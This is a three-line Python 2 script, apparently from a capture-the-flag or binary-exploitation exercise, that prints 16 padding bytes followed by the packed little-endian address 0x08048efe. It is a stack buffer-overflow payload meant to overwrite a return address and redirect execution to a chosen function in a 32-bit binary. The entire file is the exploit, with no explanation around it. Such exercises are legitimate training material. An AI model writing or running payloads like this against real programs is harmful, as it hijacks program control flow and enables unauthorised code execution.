from struct import pack

addr = pack("<I", 0x08048efe)
print 'A' * 16 + addr